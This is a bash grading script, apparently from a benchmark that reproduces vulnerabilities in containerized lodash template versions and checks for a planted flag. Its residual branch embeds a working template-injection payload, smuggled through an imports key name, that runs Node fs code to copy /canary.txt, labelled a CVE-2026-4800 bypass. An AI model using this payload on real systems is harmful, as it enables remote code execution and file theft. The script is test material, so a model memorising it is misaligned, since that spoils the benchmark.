#!/usr/bin/env bash
# verify.sh --seed|--residual — 0=效果发生(flag出现) 10=未发生 20=环境失败 30=参数错误
# seed 路径：poc/seed_exec.py <candidate.json> <version>（公开执行器）；residual 需 case 补实现。
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
PORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-80}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
export PCB_TARGET_PORT="${PORT:-}"
if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" 2>/dev/null || "$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null)"
  CAND="${CAND:-"{}"}"
  # 容错：非 JSON 输出（如纯路径字符串）包装成 {"path": ...}
  CAND="$("$PY" -c "import json,sys
s = sys.argv[1]
try:
    json.loads(s)
    print(s)
except Exception:
    print(json.dumps({'path': s.strip(), 'to': s.strip(), 'payload': s.strip(), 'css': s.strip()}))" "$CAND")"
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
  export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"  # poc_common importable
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
else
  # residual: CVE-2026-4800（_heldout/bypass_poc.py 语义内嵌）— options.imports 的 KEY 名进入
  # Function() 参数名，`x=<expr>` 默认参数在编译期执行（app 把用户 imports 名绑定为 undefined）；
  # V1(4.17.21) 只校验了 options.variable（CVE-2021-23337 修复），imports keys 未校验。
  # payload 把 /canary.txt（=${PCB_FLAG} 植入）写入 /tmp/pwn.txt，seed_exec 经 docker exec 读出。
  # seed_exec 的 CONTAINER 名按 COMPOSE_PROJECT_NAME 修正（平台动态项目名 pcb_<run>）。
  # candidate 字面量内嵌（不引用 hidden 文件）；走 seed_exec.run_probe + 尾部统一判定。
  CAND='{"probe_id": "cve-2026-4800-imports-keys", "body": {"source": "X", "importsKeys": ["x=process.getBuiltinModule(\"fs\").writeFileSync(\"/tmp/pwn.txt\", process.getBuiltinModule(\"fs\").readFileSync(\"/canary.txt\"))"]}}'
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
  OUT="$("$PY" - "$CASE_DIR" "$WORK_DIR/cand.json" "$VERSION" "$COMPOSE_PROJECT_NAME" 2>&1 <<'PYEOF'
import importlib.util, json, os, sys
from pathlib import Path
case_dir, cand_path, version, project = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
spec = importlib.util.spec_from_file_location("seed_exec", os.path.join(case_dir, "poc", "seed_exec.py"))
se = importlib.util.module_from_spec(spec)
spec.loader.exec_module(se)  # 先加载（模块顶层 CONTAINER=... 会覆盖预注入值）
se.CONTAINER = {"v0": f"{project}-v0-1", "v1": f"{project}-v1-1", "v2": f"{project}-v2-1"}
cand = json.load(open(cand_path))
r = se.run_probe(cand, version=version)
print(json.dumps(r, default=str))
PYEOF
)" || { echo "$OUT" >&2; exit 20; }
fi
BODY="$(printf '%s' "$OUT" | "$PY" -c "import json,sys
try:
    d = json.load(sys.stdin)
    print(d.get('body') or d.get('fetched_body') or json.dumps(d, ensure_ascii=False))
except Exception:
    print('')" 2>/dev/null)"
echo "${BODY:0:500}"
if grep -q "$RUN_FLAG" <<<"$BODY"; then exit 0; else exit 10; fi
